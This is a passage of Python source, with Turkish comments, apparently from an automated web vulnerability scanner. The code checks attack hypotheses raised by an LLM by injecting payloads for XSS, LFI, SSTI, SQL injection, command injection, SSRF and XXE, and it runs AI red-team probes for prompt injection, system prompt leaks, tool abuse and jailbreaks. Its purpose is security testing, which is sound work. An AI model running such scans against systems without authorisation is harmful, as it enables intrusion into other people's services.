                                   f"LLM-zanaatı XSS payload'u ('{tmpl}') param '{k}' üzerinden "
                                   f"HAM (escape-siz) yansıdı — bağlam-uyarlı reflected XSS TEYİT.")
        return Verdict(False, 0.0, "xss-llm-adaptive",
                       "LLM-zanaatı payload'ları da XSS doğrulamadı.")

    if vuln_class == "lfi":
        baseline = await _fetch_body(client, url)
        baseline_sig = detect_lfi_signature(baseline or "")
        for payload in payloads:
            for inj in _replace_param_urls(url, payload, only_param=only):
                body = await _fetch_body(client, inj)
                if body is None:
                    continue
                sig = detect_lfi_signature(body)
                if sig and sig != baseline_sig:
                    return Verdict(True, 0.9, "lfi-llm-adaptive",
                                   f"LLM-zanaatı LFI payload'u ('{payload}') → '{sig}' imzası "
                                   f"(baseline'da yok) — bağlam-uyarlı LFI TEYİT.")
        return Verdict(False, 0.0, "lfi-llm-adaptive",
                       "LLM-zanaatı payload'ları da LFI doğrulamadı.")

    if vuln_class == "ssti":
        a, b, product, raw_expr = _ssti_marker()
        baseline = await _fetch_body(client, url) or ""
        if str(product) in baseline:
            return Verdict(False, 0.0, "ssti-llm-adaptive",
                           "Marker çarpımı baseline'da — tesadüf elemesi, doğrulanmadı.")
        for tmpl in payloads:
            payload = tmpl.replace("{A}", str(a)).replace("{B}", str(b))
            for i, (k, v) in enumerate(params):
                if only and k != only:
                    continue
                mutated = list(params)
                mutated[i] = (k, f"{v}{payload}")
                inj = urlunsplit((parts.scheme, parts.netloc, parts.path,
                                  urlencode(mutated), parts.fragment))
                body = await _fetch_body(client, inj)
                if body and ssti_arithmetic_evaluated(body, product, raw_expr):
                    return Verdict(True, 0.9, "ssti-llm-adaptive",
                                   f"LLM-zanaatı SSTI payload'u ('{tmpl}') yanıtta {product} "
                                   f"olarak HESAPLANDI — bağlam/motor-uyarlı SSTI TEYİT.")
        return Verdict(False, 0.0, "ssti-llm-adaptive",
                       "LLM-zanaatı payload'ları da SSTI doğrulamadı.")

    return Verdict(False, 0.0, f"{vuln_class}-llm-adaptive",
                   f"'{vuln_class}' sınıfı adaptif doğrulama desteklemiyor.")


# ============================================================
# AI/LLM red-team doğrulayıcı (Faz A) — hipotez→deterministik kanıt köprüsü
# ============================================================
# LLM hipotezi "şu URL prompt-injection'a açık" der; kanıt YİNE llm_redteam'in deterministik
# oracle'ından (marker yansıması / OAST callback / amplifikasyon oranı) gelir. Böylece AI
# sınıfları doktrini bozmadan mevcut hypothesis→verify hattına oturur (LLM karar vermez).

async def verify_ai_probe(url: str, vuln_class: str, client: httpx.AsyncClient, *,
                          oast_client: Optional[Any] = None) -> Verdict:
    """AI/LLM sınıfını llm_redteam.run_class_probe ile AKTİF doğrula. Kanıt yoksa
    verified=False (FP üretmez). `skipped` yalnız modül yüklenemezse/URL geçersizse True."""
    parts = urlsplit(url or "")
    if parts.scheme not in ("http", "https") or not parts.netloc:
        return Verdict(False, 0.0, f"ai-{vuln_class}", "Geçersiz URL — AI doğrulaması atlandı.",
                       skipped=True)
    try:
        from .llm_redteam import run_class_probe, AI_CLASSES
    except Exception as e:  # pragma: no cover — import hatası motoru düşürmesin
        return Verdict(False, 0.0, f"ai-{vuln_class}", f"llm_redteam yüklenemedi: {e}",
                       skipped=True)
    if vuln_class not in AI_CLASSES:
        return Verdict(False, 0.0, f"ai-{vuln_class}", "'{vuln_class}' AI sınıfı değil.",
                       skipped=True)
    try:
        finding = await run_class_probe(client, url, vuln_class, oast_client=oast_client)
    except Exception as e:
        return Verdict(False, 0.0, f"ai-{vuln_class}",
                       f"AI probe çalıştırılamadı ({type(e).__name__}: {e}).")
    if not finding:
        return Verdict(False, 0.0, f"ai-{vuln_class}",
                       "AI probe kanıt üretmedi (endpoint LLM değil veya savunma aktif).")
    tier = str(finding.get("confidence_tier") or "unconfirmed").lower()
    conf = 0.9 if tier == "confirmed" else 0.6 if tier == "probable" else 0.3
    return Verdict(True, conf, f"ai-{vuln_class}", finding.get("proof", ""),
                   severity=finding.get("severity"))


async def verify_hypothesis(hyp: Any, client: httpx.AsyncClient, *, delay_seconds: float = 5.0,
                            mutations: Optional[List[Mutation]] = None,
                            oast_client: Optional[Any] = None):
    """Plan B köprüsü: LLM'in bir saldırı hipotezini (AttackHypothesis) sınıfına göre AKTİF
    doğrular. vuln_class'a göre ilgili doğrulayıcıya yönlendirir. Hipotez `url`/`vuln_class`
    alanlarıyla duck-type kullanılır (döngüsel import yok).
    `mutations` (WAF profili) verilirse doğrulayıcı YALNIZ mutasyonlu varyantları dener
    (include_identity=False — temel payload'lar ilk denemede zaten atıldı, istek israfı
    olmaz); kanıt varyantla gelirse verdict.mutation adı taşır (öğrenen döngü).

    DÖNEN TİP bir DATACLASS sözlüğü (.to_dict()) — SqliVerdict / XssVerdict / Verdict.
    Hepsi `verified/confidence/method/detail` ortak alanlarına sahip; çağıran bunları kullanır
    (tür-düzensiz ama uyumlu — Python dataclass'lar duck-type ile çalışır)."""
    vuln_class = getattr(hyp, "vuln_class", "")
    url = getattr(hyp, "url", "")
    param = getattr(hyp, "param", None)
    # P0-B: hipotez method+gövde taşıyabilir (LLM/OpenAPI/form tohumu). Varsayılanlar
    # geriye-uyumlu: alan yoksa klasik GET sorgu hattı (eski hipotezler aynen çalışır).
    method = getattr(hyp, "method", "get") or "get"
    body_params = getattr(hyp, "body_params", None)
    body_kind = getattr(hyp, "body_kind", "form") or "form"
    if vuln_class == "sqli":
        # Madde 3: zincir orakl (error → boolean → time). İmza uyumluluğu korunur —
        # verify_sqli de SqliVerdict döner; time-only eski davranış fallback'tir.
        return await verify_sqli(url, client, delay_seconds=delay_seconds,
                                 mutations=mutations, method=method,
                                 body_params=body_params, body_kind=body_kind)
    if vuln_class == "xss":
        return await verify_reflected_xss(url, client, mutations=mutations, method=method,
                                          body_params=body_params, body_kind=body_kind)
    # Grup A (§5): kendine yeterli doğrulayıcılar — LLM'in hedeflediği parametre ipucu
    # verifier'a geçirilir; parametre uyuşmazsa verifier tüm parametreleri dener.
    if vuln_class == "lfi":
        return await verify_lfi(url, param, client, mutations=mutations, method=method,
                                body_params=body_params, body_kind=body_kind)
    if vuln_class == "open_redirect":
        return await verify_open_redirect(url, param, client, mutations=mutations,
                                          method=method, body_params=body_params,
                                          body_kind=body_kind)
    if vuln_class == "ssti":
        return await verify_ssti(url, param, client, mutations=mutations, method=method,
                                 body_params=body_params, body_kind=body_kind)
    # RCE / komut enjeksiyonu — echo-marker in-band (Grup A). Daha önce doğrulayıcısı
    # yoktu → CWE-78 bulguları hep 'unconfirmed' kalıyordu; artık aktif teyit edilir.
    if vuln_class == "rce":
        return await verify_rce(url, param, client, mutations=mutations, method=method,
                                body_params=body_params, body_kind=body_kind)
    # T2-B: CORS/JWT/SSRF/XXE. Bunlar mutasyon/gövde-enjeksiyon hattını KULLANMAZ
    # (kendi deterministik yöntemleri var); ortak Verdict şekliyle dönerler.
    if vuln_class == "cors":
        return await verify_cors(url, client)
    if vuln_class == "jwt":
        # Token hipotezde taşınır (auth başlığı/cookie/JS sızıntısı kaynaklı).
        token = getattr(hyp, "token", None) or ""
        return verify_jwt(token)
    if vuln_class == "ssrf":
        return await verify_ssrf(url, param, client, oast_client=oast_client)
    if vuln_class == "xxe":
        return await verify_xxe(url, client, method=method, oast_client=oast_client)
    # Faz A — AI/LLM red-team sınıfları (deterministik oracle: llm_redteam).
    if vuln_class in ("prompt_injection", "indirect_prompt_injection", "system_prompt_leak",
                      "output_handling", "output_handling_ssrf", "tool_abuse",
                      "multiturn_jailbreak", "denial_of_wallet"):
        return await verify_ai_probe(url, vuln_class, client, oast_client=oast_client)
    return Verdict(False, 0.0, str(vuln_class) or "unknown",
                   f"'{vuln_class}' sınıfı için doğrulayıcı henüz yok — hipotez atlandı.",
                   skipped=True)
